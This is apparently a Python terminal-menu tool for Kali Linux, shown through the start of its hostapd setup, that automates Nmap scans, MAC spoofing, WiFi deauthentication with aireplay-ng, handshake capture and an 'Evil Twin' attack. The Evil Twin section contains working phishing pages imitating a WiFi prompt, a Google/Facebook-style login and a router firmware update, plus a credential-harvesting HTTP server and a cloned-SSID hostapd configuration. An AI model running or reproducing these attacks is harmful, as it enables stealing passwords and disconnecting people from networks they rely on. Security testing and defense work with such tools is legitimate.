import curses
import subprocess
import os
import socket
from datetime import datetime
import csv
import time

BASE_DIR_WIFI = "Resultados_Handshake"

# ==========================================
# 0. CONFIGURACIÓN INICIAL Y DE SESIÓN
# ==========================================
# Directorio base y directorio específico para la sesión actual
BASE_DIR = "Resultados_Nmap"

# Generamos el nombre de la carpeta de esta sesión (se creará físicamente al lanzar el primer escaneo)
timestamp = datetime.now().strftime("%Y-%m-%d-%H-%M-%S")
SESSION_DIR = os.path.join(BASE_DIR, f"Auditoria-{timestamp}")

def obtener_ip_y_rango_kali():
    s = socket.socket(socket.AF_INET, socket.SOCK_DGRAM)
    try:
        s.connect(('8.8.8.8', 80))
        ip_actual = s.getsockname()[0]
    except Exception:
        return '127.0.0.1', '/8'
    finally:
        s.close()

    try:
        salida = subprocess.check_output(['ip', '-o', '-f', 'inet', 'addr', 'show']).decode('utf-8')
        for linea in salida.splitlines():
            if ip_actual in linea:
                for elemento in linea.split():
                    if elemento.startswith(f"{ip_actual}/"):
                        cidr = f"/{elemento.split('/')[1]}"
                        return ip_actual, cidr
    except Exception:
        pass
    return ip_actual, None

ip_inicial, rango_inicial = obtener_ip_y_rango_kali()

# ==========================================
# 1. GESTIÓN DE ESTADO GLOBAL
# ==========================================
ESTADO = {
    "ip": ip_inicial,
    "rango": rango_inicial,
    "usar_rango": False 
}

def obtener_target():
    if ESTADO["usar_rango"] and ESTADO["rango"]:
        return f"{ESTADO['ip']}{ESTADO['rango']}"
    return ESTADO["ip"]

SCAN_SPEED = "-T4"
MIN_RATE = "--min-rate=1000"

# ==========================================
# 2. FUNCIONES LÓGICAS (CALLBACKS DE PYTHON)
# ==========================================
def cambiar_rango(activar):
    ESTADO["usar_rango"] = activar
    estado_str = "ACTIVADO (Escaneando toda la subred)" if activar else "DESACTIVADO (Escaneando solo un objetivo)"
    print(f"[+] Uso de rango de red: {estado_str}")
    print(f"[+] El nuevo objetivo para los escaneos es: {obtener_target()}")

def ingresar_ip_manual():
    print(f"Objetivo actual: {obtener_target()}")
    nueva_ip = input("\nIngresa la nueva IP o dominio (ej. 10.10.10.5 o scanme.nmap.org): ")
    
    if nueva_ip.strip():
        ESTADO["ip"] = nueva_ip.strip()
        ESTADO["usar_rango"] = False 
        print(f"\n[+] Objetivo actualizado exitosamente a: {ESTADO['ip']}")
    else:
        print("\n[-] Operación cancelada. Se mantiene el objetivo anterior.")

# ==========================================
# 3. CLASES DE ACCIÓN (COMMAND PATTERN)
# ==========================================
class AccionBash:
    def __init__(self, nombre, comando):
        self.nombre = nombre
        self.comando = comando

    def ejecutar(self):
        curses.endwin()
        os.system('clear')
        
        comando_final = self.comando.replace("{TARGET}", obtener_target())
        
        # Creamos la carpeta de sesión dinámicamente si el comando va a guardar resultados ahí
        if BASE_DIR in comando_final and not os.path.exists(SESSION_DIR):
            os.makedirs(SESSION_DIR, exist_ok=True)
        
        print(f"[*] Ejecutando Módulo: {self.nombre}")
        print(f"[*] Objetivo actual: {obtener_target()}")
        print(f"[*] Comando Bash: {comando_final}\n")
        print("=" * 50)
        
        try:
            subprocess.run(comando_final, shell=True)
        except Exception as e:
            print(f"[!] Error crítico al ejecutar: {e}")
            
        print("=" * 50)
        print("\n[Presiona ENTER para regresar al menú anterior]")
        input()

class AccionPython:
    def __init__(self, nombre, funcion, *args, **kwargs):
        self.nombre = nombre
        self.funcion = funcion
        self.args = args
        self.kwargs = kwargs

    def ejecutar(self):
        curses.endwin()
        os.system('clear')
        
        print(f"[*] Ejecutando Configuración Interna: {self.nombre}")
        print("=" * 50 + "\n")
        
        try:
            self.funcion(*self.args, **self.kwargs)
        except Exception as e:
            print(f"\n[!] Error crítico en la función Python: {e}")
            
        print("\n" + "=" * 50)
        print("[Presiona ENTER para regresar al menú anterior]")
        input()

class AccionMenuDinamico:
    """Clase nueva: Genera un menú al vuelo y lo inyecta en la TUI sin perder la posición actual"""
    def __init__(self, titulo, funcion_generadora):
        self.titulo = titulo
        self.funcion_generadora = funcion_generadora

    def ejecutar(self, app):
        nuevo_menu = self.funcion_generadora()
        if nuevo_menu:
            app.pila_menus.append(nuevo_menu)

# ==========================================
# 4. SISTEMA DE MENÚS (TUI Engine)
# ==========================================
class Menu:
    def __init__(self, titulo):
        self.titulo = titulo
        self.opciones = [] 
        self.indice_actual = 0

    def agregar_opcion(self, nombre, destino):
        self.opciones.append((nombre, destino))

class AplicacionTUI:
    def __init__(self, stdscr, menu_raiz):
        self.stdscr = stdscr
        self.pila_menus = [menu_raiz] 
        curses.curs_set(0)
        self.stdscr.keypad(True)

    def dibujar_interfaz(self):
        self.stdscr.clear()
        alto, ancho = self.stdscr.getmaxyx()
        
        if alto < 12 or ancho < 65:
            mensaje = "Terminal muy pequeña. Agrándala para usar la herramienta."
            try:
                self.stdscr.addstr(alto//2, max(0, (ancho//2) - (len(mensaje)//2)), mensaje)
            except curses.error: pass
            self.stdscr.refresh()
            return False

        menu_actual = self.pila_menus[-1]
        
        titulo = f"=== {menu_actual.titulo} ==="
        if len(self.pila_menus) > 1:
            subtitulo = "[ ↑/↓: Navegar | ESPACIO: Seleccionar | ←: Volver | Q: Salir ]"
        else:
            subtitulo = "[ ↑/↓: Navegar | ESPACIO: Seleccionar | Q: Salir ]"

        self.stdscr.addstr(1, (ancho // 2) - (len(titulo) // 2), titulo, curses.A_BOLD | curses.A_UNDERLINE)
        self.stdscr.addstr(2, (ancho // 2) - (len(subtitulo) // 2), subtitulo)

        for i, (nombre, _) in enumerate(menu_actual.opciones):
            texto = f" {i}. {nombre} " if menu_actual.titulo == "AUDITORÍA NMAP" else f" {i+1}. {nombre} "
            x = (ancho // 2) - (len(texto) // 2)
            y = 5 + i
            
            if y < alto - 1:
                if i == menu_actual.indice_actual:
                    self.stdscr.addstr(y, x, f">>{texto}<<", curses.A_REVERSE | curses.A_BOLD)
                else:
                    self.stdscr.addstr(y, x, f"  {texto}  ")

        self.stdscr.refresh()
        return True

    def ejecutar(self):
        while True:
            espacio_suficiente = self.dibujar_interfaz()
            tecla = self.stdscr.getch()
            
            if not espacio_suficiente:
                if tecla in [ord('q'), ord('Q')]: break
                continue

            menu_actual = self.pila_menus[-1]

            if tecla == curses.KEY_UP and menu_actual.indice_actual > 0:
                menu_actual.indice_actual -= 1
            elif tecla == curses.KEY_DOWN and menu_actual.indice_actual < len(menu_actual.opciones) - 1:
                menu_actual.indice_actual += 1
            elif tecla == ord(' '):
                destino_seleccionado = menu_actual.opciones[menu_actual.indice_actual][1]
                
                # Integración del nuevo comportamiento de menús dinámicos
                if isinstance(destino_seleccionado, Menu):
                    self.pila_menus.append(destino_seleccionado)
                elif isinstance(destino_seleccionado, AccionMenuDinamico):
                    destino_seleccionado.ejecutar(self) # Le pasamos la 'app' para que pueda apilar el menú
                elif isinstance(destino_seleccionado, (AccionBash, AccionPython)):
                    destino_seleccionado.ejecutar()
                    
            elif tecla == curses.KEY_LEFT or tecla == ord('b') or tecla == curses.KEY_BACKSPACE:
                if len(self.pila_menus) > 1:
                    self.pila_menus.pop()
            elif tecla in [ord('q'), ord('Q')]:
                break 

# ==========================================
# 5. GENERADORES DINÁMICOS PARA EL EXPLORADOR 
# ==========================================
def generar_menu_archivos(ruta_carpeta):
    """Escanea los archivos .txt dentro de una auditoría y crea un menú para leerlos"""
    nombre_carpeta = os.path.basename(ruta_carpeta)
    menu = Menu(f"ARCHIVOS EN {nombre_carpeta}")
    
    try:
        archivos = sorted([f for f in os.listdir(ruta_carpeta) if os.path.isfile(os.path.join(ruta_carpeta, f))])
    except Exception:
        archivos = []

    if not archivos:
        menu.agregar_opcion("Carpeta vacía (Regresar)", AccionBash("Vacío", "echo 'No hay archivos para mostrar.'"))
        return menu

    for archivo in archivos:
        ruta_archivo = os.path.join(ruta_carpeta, archivo)
        # Usamos 'less' para leer el reporte sin romper la terminal
        menu.agregar_opcion(f"{archivo}", AccionBash(f"Leyendo {archivo}", f"less '{ruta_archivo}'"))

    return menu

def generar_menu_carpetas():
    """Escanea la carpeta base y crea un menú con todas las sesiones de auditoría"""
    menu = Menu("AUDITORÍAS GUARDADAS")
    
    if not os.path.exists(BASE_DIR):
        menu.agregar_opcion("Directorio vacío (Aún no hay escaneos)", AccionBash("Vacío", "echo 'Realiza un escaneo primero.'"))
        return menu

    carpetas = sorted([d for d in os.listdir(BASE_DIR) if os.path.isdir(os.path.join(BASE_DIR, d))], reverse=True)

    if not carpetas:
        menu.agregar_opcion("No hay auditorías guardadas", AccionBash("Vacío", "echo 'No se encontraron auditorías.'"))
        return menu

    for carpeta in carpetas:
        ruta_carpeta = os.path.join(BASE_DIR, carpeta)
        # Usamos una función lambda para inyectar la ruta correcta de forma aislada para cada iteración
        menu.agregar_opcion(f"{carpeta}", AccionMenuDinamico(carpeta, lambda r=ruta_carpeta: generar_menu_archivos(r)))

    return menu


# ==========================================
# GESTIÓN DE MACCHANGER
# ==========================================
def obtener_interfaces():
    """Lee las interfaces de red directamente del sistema operativo"""
    try:
        # Filtramos 'lo' (loopback) ya que normalmente no se le cambia la MAC
        return sorted([i for i in os.listdir('/sys/class/net/') if i != "lo"])
    except Exception:
        return []

def ingresar_mac_personalizada(interfaz):
    """Callback de Python para pedir la MAC e inyectarla en el comando"""
    print(f"[*] Interfaz a modificar: {interfaz}")
    nueva_mac = input("\nIngresa la nueva MAC (ej. 00:11:22:33:44:55): ")
    
    if nueva_mac.strip():
        # Encadenamos ifconfig down -> macchanger -> ifconfig up
        comando = f"sudo ifconfig {interfaz} down && sudo macchanger -m {nueva_mac.strip()} {interfaz} && sudo ifconfig {interfaz} up"
        print(f"\n[*] Aplicando cambios...\n")
        subprocess.run(comando, shell=True)
    else:
        print("\n[-] Operación cancelada. No se ingresó ninguna MAC.")

def generar_menu_opciones_mac(interfaz):
    """Genera las opciones de Macchanger para la interfaz seleccionada"""
    menu = Menu(f"OPCIONES MAC: {interfaz}")
    
    # Plantilla base para evitar repetir la bajada y subida de la interfaz en cada opción
    cmd_base = f"sudo ifconfig {interfaz} down && sudo macchanger {{}} {interfaz} && sudo ifconfig {interfaz} up"

    menu.agregar_opcion("Ver información actual de la MAC", AccionBash("Info MAC", f"sudo macchanger -s {interfaz}"))
    menu.agregar_opcion("Resetear a la dirección MAC original", AccionBash("Reset MAC", cmd_base.format("-p")))
    menu.agregar_opcion("Asignar una MAC aleatoria del mismo fabricante", AccionBash("MAC Mismo Fabricante", cmd_base.format("-a")))
    menu.agregar_opcion("Cambiar a una MAC random", AccionBash("MAC Random", cmd_base.format("-r")))
    menu.agregar_opcion("Utilizar una MAC personalizada", AccionPython("MAC Personalizada", ingresar_mac_personalizada, interfaz))
    # Pasamos la salida por 'less' por si la lista de fabricantes es muy larga para la pantalla
    menu.agregar_opcion("Ver la lista de fabricantes soportados", AccionBash("Fabricantes", "sudo macchanger -l | less"))
    
    return menu

def generar_menu_interfaces():
    """Genera el menú dinámico que escanea y muestra las interfaces de red"""
    menu = Menu("SELECCIONAR INTERFAZ DE RED")
    interfaces = obtener_interfaces()

    if not interfaces:
        menu.agregar_opcion("No se encontraron interfaces", AccionBash("Error", "echo 'No se detectaron interfaces de red en el sistema.'"))
        return menu

    for interfaz in interfaces:
        # Usamos una lambda aislando el valor 'i=interfaz' para evitar problemas de sobrescritura en el bucle
        menu.agregar_opcion(f"Configurar {interfaz}", AccionMenuDinamico(f"Macchanger {interfaz}", lambda i=interfaz: generar_menu_opciones_mac(i)))

    return menu


# ==========================================
# GESTIÓN DE AUDITORÍA INALÁMBRICA (WIFI)
# ==========================================
def habilitar_modo_monitor(interfaz):
    """Mata procesos conflictivos y levanta la interfaz en modo monitor"""
    print(f"[*] Preparando la interfaz {interfaz} para modo monitor...")
    os.system("sudo airmon-ng check kill")
    os.system(f"sudo airmon-ng start {interfaz}")
    print(f"\n[+] Interfaz configurada. Normalmente cambia de nombre (ej. {interfaz}mon o wlan0mon).")
    print("\nVerifica el nuevo nombre con ifconfig o en el menú de selección.")

def generar_menu_monitor():
    """Genera menú con interfaces disponibles para poner en modo monitor"""
    menu = Menu("ACTIVAR MODO MONITOR")
    interfaces = obtener_interfaces() 
    if not interfaces:
        menu.agregar_opcion("No se encontraron interfaces", AccionBash("Error", "echo 'No hay interfaces de red detectadas.'"))
        return menu
    for iface in interfaces:
        menu.agregar_opcion(f"Poner {iface} en modo monitor", AccionPython(f"Monitor {iface}", habilitar_modo_monitor, iface))
    return menu


def iniciar_ataque_y_generar_menu(interfaz, target, station):
    """Submenú 4: Menú interactivo de ataque que mantiene airodump-ng en segundo plano"""
    timestamp = datetime.now().strftime("%Y-%m-%d-%H-%M-%S")
    session_dir = f"{BASE_DIR_WIFI}/Auditoria-{timestamp}"
    os.makedirs(session_dir, exist_ok=True)
    
    # Limpieza preventiva por si quedó un proceso fantasma de esta misma red
    os.system(f"sudo pkill -f 'airodump-ng --channel {target['ch']} --bssid {target['bssid']}' > /dev/null 2>&1")
    
    # Iniciamos airodump-ng silenciosamente en background
    os.system(f"sudo airodump-ng --channel {target['ch']} --bssid {target['bssid']} -w {session_dir}/Captura {interfaz} > /dev/null 2>&1 &")
    
    menu = Menu(f"ATAQUE EN CURSO: {target['essid'][:10]}")
    
    comando_deauth = f"sudo aireplay-ng -0 9 -a {target['bssid']} -c {station} {interfaz}"
    
    # Puedes presionar espacio aquí repetidas veces para enviar múltiples ráfagas
    menu.agregar_opcion("=> 1. Enviar ráfaga de desautenticación <=", AccionBash("Deauth", comando_deauth))
    menu.agregar_opcion("=> 2. FINALIZAR ATAQUE (Detener Airodump) <=", AccionPython("Detener", detener_ataque_bg, target, session_dir))
    
    return menu

def detener_ataque_bg(target, session_dir):
    """Callback para matar airodump-ng cuando el usuario decide terminar"""
    os.system(f"sudo pkill -f 'airodump-ng --channel {target['ch']} --bssid {target['bssid']}'")
    print("\n[*] Proceso airodump-ng detenido exitosamente.")
    print(f"[+] Revisa la carpeta en busca del handshake: {session_dir}/")
    print("\n[!] IMPORTANTE: Ahora presiona la tecla IZQUIERDA (←) para volver al menú de clientes.")

def generar_menu_clientes(interfaz, target, clientes_objetivo):
    """Submenú 3: Seleccionar cliente a desautenticar"""
    menu = Menu(f"CLIENTES EN: {target['essid'][:10]}")
    
    menu.agregar_opcion("=> Enviar a todos (Broadcast FF:FF:FF:FF:FF:FF) <=", 
                        AccionMenuDinamico("Broadcast", lambda i=interfaz, t=target, s="FF:FF:FF:FF:FF:FF": iniciar_ataque_y_generar_menu(i, t, s)))

    if not clientes_objetivo:
        menu.agregar_opcion("[No se detectaron clientes. Solo puedes usar Broadcast]", 
                            AccionBash("Info", "echo 'Elige la opción Broadcast'"))
    else:
        for c_mac in clientes_objetivo:
            menu.agregar_opcion(f"Desautenticar cliente: {c_mac}", 
                                AccionMenuDinamico(f"Ataque {c_mac}", lambda i=interfaz, t=target, s=c_mac: iniciar_ataque_y_generar_menu(i, t, s)))
    return menu

def escaneo_y_generar_menu_redes(interfaz):
    """Submenú 2: Escanear el entorno por 10s y generar menú con las redes encontradas"""
    curses.endwin()
    os.system('clear')
    print(f"[*] Iniciando escaneo silencioso de 10 segundos en {interfaz}...")
    print("[*] Por favor, espera y no presiones ninguna tecla...")

    scan_base = "/tmp/wifi_scan"
    os.system(f"sudo rm -f {scan_base}-01.csv")
    
    os.system(f"sudo timeout 10s airodump-ng {interfaz} -w {scan_base} --output-format csv > /dev/null 2>&1")

    redes = []
    clientes = []
    
    try:
        with open(f"{scan_base}-01.csv", "r", encoding="utf-8", errors="ignore") as f:
            contenido = f.read()
            partes = contenido.split("Station MAC,")
            
            lineas_redes = partes[0].split("\n")[2:] 
            for linea in lineas_redes:
                row = linea.split(",")
                if len(row) >= 14 and ":" in row[0]:
                    redes.append({
                        "bssid": row[0].strip(),
                        "ch": row[3].strip(),
                        "essid": row[13].strip() if row[13].strip() else "<Oculta>"
                    })
                    
            if len(partes) > 1:
                lineas_clientes = partes[1].split("\n")[1:]
                for linea in lineas_clientes:
                    row = linea.split(",")
                    if len(row) >= 6 and ":" in row[0]:
                        clientes.append({
                            "mac": row[0].strip(),
                            "bssid": row[5].strip()
                        })
    except Exception as e:
        menu_err = Menu("ERROR DE ESCANEO")
        menu_err.agregar_opcion(f"Error al leer: {e}", AccionBash("Error", f"echo '{e}'"))
        return menu_err

    if not redes:
        menu_vacio = Menu("RESULTADOS DEL ESCANEO")
        menu_vacio.agregar_opcion("No se encontraron redes. (Regresar)", AccionBash("Vacío", "echo 'Intenta acercarte al objetivo.'"))
        return menu_vacio

    menu_redes = Menu("SELECCIONAR RED OBJETIVO")
    for red in redes:
        clientes_red = [c["mac"] for c in clientes if c["bssid"] == red["bssid"]]
        texto_opcion = f"{red['essid']} (CH:{red['ch']} | BSSID:{red['bssid']} | Clientes:{len(clientes_red)})"
        menu_redes.agregar_opcion(texto_opcion, 
                                  AccionMenuDinamico(f"Red {red['essid']}", lambda i=interfaz, r=red, c=clientes_red: generar_menu_clientes(i, r, c)))
    return menu_redes

def generar_menu_interfaces_captura():
    """Submenú 1: Seleccionar la interfaz para iniciar la captura"""
    menu = Menu("SELECCIONAR INTERFAZ PARA CAPTURA")
    interfaces = obtener_interfaces()

    if not interfaces:
        menu.agregar_opcion("No se encontraron interfaces", AccionBash("Error", "echo 'No se detectaron interfaces.'"))
        return menu

    for iface in interfaces:
        menu.agregar_opcion(f"Usar {iface}", AccionMenuDinamico(f"Escaneando {iface}", lambda i=iface: escaneo_y_generar_menu_redes(i)))

    return menu


# ==========================================
# EXPLORADOR DE HANDSHAKES
# ==========================================
def generar_menu_archivos_wifi(ruta_carpeta):
    nombre_carpeta = os.path.basename(ruta_carpeta)
    menu = Menu(f"ARCHIVOS EN {nombre_carpeta}")
    try:
        archivos = sorted([f for f in os.listdir(ruta_carpeta) if os.path.isfile(os.path.join(ruta_carpeta, f))])
    except Exception:
        archivos = []

    if not archivos:
        menu.agregar_opcion("Carpeta vacía", AccionBash("Vacío", "echo 'No hay capturas aquí.'"))
        return menu

    for archivo in archivos:
        ruta_archivo = os.path.join(ruta_carpeta, archivo)
        if archivo.endswith('.cap'):
            menu.agregar_opcion(f"{archivo} (Ver Info)", AccionBash("Aircrack Info", f"aircrack-ng '{ruta_archivo}'"))
        else:
            menu.agregar_opcion(f"{archivo} (Leer)", AccionBash(f"Leyendo {archivo}", f"less '{ruta_archivo}'"))

    return menu

def generar_menu_carpetas_wifi():
    menu = Menu("CAPTURAS HANDSHAKE GUARDADAS")
    if not os.path.exists(BASE_DIR_WIFI):
        menu.agregar_opcion("Directorio vacío", AccionBash("Vacío", "echo 'Realiza una captura primero.'"))
        return menu
    carpetas = sorted([d for d in os.listdir(BASE_DIR_WIFI) if os.path.isdir(os.path.join(BASE_DIR_WIFI, d))], reverse=True)
    if not carpetas:
        menu.agregar_opcion("No hay auditorías", AccionBash("Vacío", "echo 'No se encontraron auditorías.'"))
        return menu

    for carpeta in carpetas:
        ruta_carpeta = os.path.join(BASE_DIR_WIFI, carpeta)
        menu.agregar_opcion(f"{carpeta}", AccionMenuDinamico(carpeta, lambda r=ruta_carpeta: generar_menu_archivos_wifi(r)))
    
    return menu



# ==========================================
# GESTIÓN DE EVIL TWIN + DEAUTH (NATIVO - HOSTAPD + DNSMASQ)
# ==========================================
EVIL_STATE = {
    "ap_iface": None,
    "deauth_iface": None,
    "mon_deauth": None,
    "target": {},
    "phishing_type": "wifi_password",  # wifi_password, oauth, firmware
    "deauth_mode": "broadcast",
    "pid_hostapd": None,
    "pid_dhcp": None
}

def limpiar_ataque_evil():
    """Detiene todos los procesos del ataque y restaura interfaces"""
    print("\n[*] Deteniendo Evil Twin y limpiando procesos...")
    os.system("sudo pkill -f 'hostapd.*evil' 2>/dev/null")
    os.system("sudo pkill -f 'dnsmasq.*evil' 2>/dev/null")
    os.system("sudo pkill -f 'python3.*http.server' 2>/dev/null")
    os.system("sudo pkill -f aireplay 2>/dev/null")
    
    # Restaurar iptables
    os.system("sudo iptables --flush 2>/dev/null")
    os.system("sudo iptables --table nat --flush 2>/dev/null")
    os.system("sudo iptables --delete-chain 2>/dev/null")
    os.system("sudo iptables --table nat --delete-chain 2>/dev/null")
    
    # Restaurar interfaces a modo managed
    for iface in [EVIL_STATE.get("ap_iface"), EVIL_STATE.get("deauth_iface")]:
        if iface:
            os.system(f"sudo ip link set {iface} down 2>/dev/null")
            os.system(f"sudo iw dev {iface} set type managed 2>/dev/null")
            os.system(f"sudo ip link set {iface} up 2>/dev/null")
    
    os.system("sudo systemctl restart NetworkManager 2>/dev/null 2>&1")
    print("[+] Limpieza completada. Interfaces restauradas.")

def generar_pagina_phishing(tipo):
    """Genera una página HTML de phishing según el tipo seleccionado"""
    html_dir = "/tmp/evil_twin_web"
    os.makedirs(html_dir, exist_ok=True)
    
    if tipo == "wifi_password":
        html = '''<!DOCTYPE html><html><head><title>WiFi Connection</title>
<meta name="viewport" content="width=device-width, initial-scale=1">
<style>body{font-family:sans-serif;max-width:400px;margin:20px auto;text-align:center}
input{width:100%;padding:12px;margin:8px 0;border:1px solid #ddd;border-radius:4px;box-sizing:border-box}
button{background:#007bff;color:white;padding:14px 20px;border:none;border-radius:4px;cursor:pointer;width:100%;font-size:16px}
button:hover{background:#0056b3}.logo{font-size:24px;font-weight:bold;margin:20px 0}</style></head><body>
<div class="logo">🔐 WiFi Security Update</div>
<p>Se requiere verificación para mantener la conexión segura.</p>
<form method="POST" action="/capture"><label>Contraseña WiFi:</label>
<input type="password" name="password" required placeholder="Ingresa la contraseña"></form>
<button type="submit">Conectar</button><p style="font-size:12px;color:#666;margin-top:20px">
Esta es una página de prueba de seguridad autorizada.</p></body></html>'''
    elif tipo == "oauth":
        html = '''<!DOCTYPE html><html><head><title>Sign In</title>
<meta name="viewport" content="width=device-width, initial-scale=1">
<style>body{font-family:sans-serif;max-width:400px;margin:20px auto;text-align:center}
input{width:100%;padding:12px;margin:8px 0;border:1px solid #ddd;border-radius:4px}
button{background:#4285f4;color:white;padding:14px;border:none;border-radius:4px;cursor:pointer;width:100%;font-size:16px}
.google{background:#db4437}.logo{font-size:28px;margin:20px 0}</style></head><body>
<div class="logo">🔐 Iniciar Sesión</div><p>Verifica tu cuenta para continuar</p>
<form method="POST" action="/capture"><input type="email" name="email" placeholder="Correo electrónico" required>
<input type="password" name="password" placeholder="Contraseña" required>
<button type="submit" class="google">Continuar</button></form></body></html>'''
    else:  # firmware
        html = '''<!DOCTYPE html><html><head><title>Firmware Update</title>
<meta name="viewport" content="width=device-width, initial-scale=1">
<style>body{font-family:sans-serif;max-width:400px;margin:20px auto;text-align:center;background:#f5f5f5}
input{width:100%;padding:12px;margin:8px 0;border:1px solid #ccc;border-radius:4px}
button{background:#28a745;color:white;padding:14px;border:none;border-radius:4px;cursor:pointer;width:100%;font-size:16px}
.alert{background:#fff3cd;border:1px solid #ffc107;padding:10px;border-radius:4px;margin:15px 0}</style></head><body>
<div class="alert">⚠️ Actualización de Firmware Requerida</div>
<p>Para mantener la seguridad de tu router, ingresa las credenciales de administración:</p>
<form method="POST" action="/capture"><input type="text" name="username" placeholder="Usuario" value="admin">
<input type="password" name="password" placeholder="Contraseña del router" required>
<button type="submit">Actualizar Firmware</button></form></body></html>'''
    
    with open(f"{html_dir}/index.html", "w") as f:
        f.write(html)
    
    # Script PHP/Python para capturar credenciales (simple HTTP POST handler)
    capture_script = '''#!/usr/bin/env python3
import http.server, socketserver, urllib.parse, os, sys
from datetime import datetime

class Handler(http.server.SimpleHTTPRequestHandler):
    def do_POST(self):
        length = int(self.headers.get("Content-Length", 0))
        data = self.rfile.read(length).decode()
        params = urllib.parse.parse_qs(data)
        
        log_file = "/tmp/evil_twin_web/credentials.log"
        with open(log_file, "a") as f:
            f.write(f"[{datetime.now()}] Captured: {params}\\n")
        
        # Redirigir a página de "éxito"
        self.send_response(302)
        self.send_header("Location", "/success.html")
        self.end_headers()
    
    def log_message(self, format, *args):
        pass  # Silenciar logs del servidor

if __name__ == "__main__":
    os.chdir("/tmp/evil_twin_web")
    with socketserver.TCPServer(("", 80), Handler) as httpd:
        print("[*] Servidor phishing activo en puerto 80")
        httpd.serve_forever()
'''
    with open(f"{html_dir}/capture.py", "w") as f:
        f.write(capture_script)
    
    # Página de éxito
    success_html = '''<!DOCTYPE html><html><head><meta http-equiv="refresh" content="3;url=http://google.com">
<title>Conectado</title><style>body{font-family:sans-serif;text-align:center;padding:50px}</style></head>
<body><h2>Conexión exitosa</h2><p>Redirigiendo...</p></body></html>'''
    with open(f"{html_dir}/success.html", "w") as f:
        f.write(success_html)
    
    return html_dir

def generar_menu_interfaces_evil():
    menu = Menu("SELECCIONAR INTERFACES EVIL TWIN")
    interfaces = obtener_interfaces()
    if len(interfaces) < 2:
        menu.agregar_opcion("Error: Se requieren mínimo 2 adaptadores WiFi", 
                            AccionBash("Error", "echo 'Conecta una segunda tarjeta USB WiFi.'"))
        return menu
    for iface in interfaces:
        menu.agregar_opcion(f"1. Interfaz AP Malicioso: {iface}", 
                            AccionMenuDinamico("Set AP", lambda i=iface: generar_menu_deauth_evil(i)))
    return menu

def generar_menu_deauth_evil(ap_iface):
    EVIL_STATE["ap_iface"] = ap_iface
    menu = Menu(f"SELECCIONAR INTERFAZ DEAUTH (AP: {ap_iface})")
    interfaces = obtener_interfaces()
    for iface in interfaces:
        if iface != ap_iface:
            menu.agregar_opcion(f"2. Interfaz Deauth: {iface}",
                                AccionMenuDinamico("Set Deauth", lambda i=iface: escanear_redes_evil(i)))
    return menu

def escanear_redes_evil(deauth_iface):
    EVIL_STATE["deauth_iface"] = deauth_iface
    curses.endwin()
    os.system('clear')
    print(f"[*] Preparando {deauth_iface} y escaneando entorno (10 seg)...")
    os.system("sudo airmon-ng check kill >/dev/null 2>&1")
    os.system("sudo rfkill unblock wifi >/dev/null 2>&1")
    os.system(f"sudo airmon-ng start {deauth_iface} >/dev/null 2>&1")
    
    mon = f"{deauth_iface}mon" if os.path.exists(f"/sys/class/net/{deauth_iface}mon") else deauth_iface
    EVIL_STATE["mon_deauth"] = mon

    scan_file = "/tmp/evil_scan"
    os.system(f"sudo rm -f {scan_file}-01.csv")
    os.system(f"sudo timeout 10s airodump-ng {mon} -w {scan_file} --output-format csv >/dev/null 2>&1")

    redes = []
    try:
        with open(f"{scan_file}-01.csv", "r", errors="ignore") as f:
            partes = f.read().split("Station MAC,")
            lineas = partes[0].split("\n")[2:]
            for l in lineas:
                r = l.split(",")
                if len(r) >= 14 and ":" in r[0]:
                    redes.append({"bssid": r[0].strip(), "ch": r[3].strip(),
                                   "essid": r[13].strip() if r[13].strip() else "<Oculta>"})
    except: pass

    if not redes:
        menu_err = Menu("ERROR ESCANEO")
        menu_err.agregar_opcion("No se detectaron redes. (Regresar)", 
                                AccionBash("Info", "echo 'Intenta de nuevo o acércate.'"))
        return menu_err

    menu_red = Menu("SELECCIONAR RED OBJETIVO")
    for red in redes:
        menu_red.agregar_opcion(f"{red['essid']} (CH:{red['ch']} | {red['bssid']})", 
                                AccionMenuDinamico("Target Set", lambda r=red: configurar_ataque_evil(r)))
    return menu_red

def configurar_ataque_evil(target):
    EVIL_STATE["target"] = target
    menu = Menu(f"CONFIGURAR ATAQUE: {target['essid']}")
    menu.agregar_opcion("Plantilla: Contraseña WiFi (Cautivo)",
                        AccionMenuDinamico("Set Page", lambda p="wifi_password": seleccionar_deauth_evil(p)))
    menu.agregar_opcion("Plantilla: Login OAuth (Google/Facebook)",
                        AccionMenuDinamico("Set Page", lambda p="oauth": seleccionar_deauth_evil(p)))
    menu.agregar_opcion("Plantilla: Actualización de Firmware",
                        AccionMenuDinamico("Set Page", lambda p="firmware": seleccionar_deauth_evil(p)))
    return menu

def seleccionar_deauth_evil(phishing_type):
    EVIL_STATE["phishing_type"] = phishing_type
    menu = Menu("MODO DE DESAUTENTICACIÓN")
    menu.agregar_opcion("Broadcast (Desconectar todos los clientes - Recomendado)",
                        AccionMenuDinamico("Ejecutar", lambda: ejecutar_ataque_evil("broadcast")))
    menu.agregar_opcion("Dirigido (Ataque a clientes específicos)",
                        AccionMenuDinamico("Ejecutar", lambda: ejecutar_ataque_evil("directed")))
    return menu

def ejecutar_ataque_evil(deauth_mode):
    limpiar_ataque_evil()
    curses.endwin()
    os.system('clear')

    target = EVIL_STATE["target"]
    ap = EVIL_STATE["ap_iface"]
    mon_deauth = EVIL_STATE.get("mon_deauth", f"{EVIL_STATE['deauth_iface']}mon")
    phishing_type = EVIL_STATE["phishing_type"]

    print("="*60)
    print("[!] EJECUTANDO EVIL TWIN NATIVO")
    print(f"    AP Interface   : {ap}")
    print(f"    Deauth Interface: {mon_deauth}")
    print(f"    Red Objetivo   : {target['essid']} ({target['bssid']}) CH:{target['ch']}")
    print(f"    Plantilla      : {phishing_type}")
    print(f"    Deauth Mode    : {deauth_mode.upper()}")
    print("="*60)
    time.sleep(2)

    try:
        # 1. Generar página de phishing
        print("[*] Generando página de phishing...")
        web_dir = generar_pagina_phishing(phishing_type)
        
        # 2. Configurar interfaz AP
        print(f"[*] Configurando {ap} como AP falso...")
        os.system(f"sudo ip link set {ap} down")
        os.system(f"sudo iw dev {ap} set type managed")
        os.system(f"sudo ip link set {ap} up")
        os.system(f"sudo ifconfig {ap} 10.0.0.1 netmask 255.255.255.0")
        
        # 3. Configurar hostapd
        hostapd_conf = f"""interface={ap}
driver=nl80211
ssid={target['essid']}
hw_mode=g
channel={target['ch']}
macaddr_acl=0
auth_algs=1
ignore_broadcast_ssid=0
wmm_enabled=0
"""
        with open("/tmp/hostapd_evil.conf", "w") as f:
            f.write(hostapd_conf)
        
        # 4. Iniciar hostapd en background
        print("[*] Iniciando hostapd...")
        os.system(f"sudo hostapd /tmp/hostapd_evil.conf >/dev/null 2>&1 &")
        time.sleep(2)
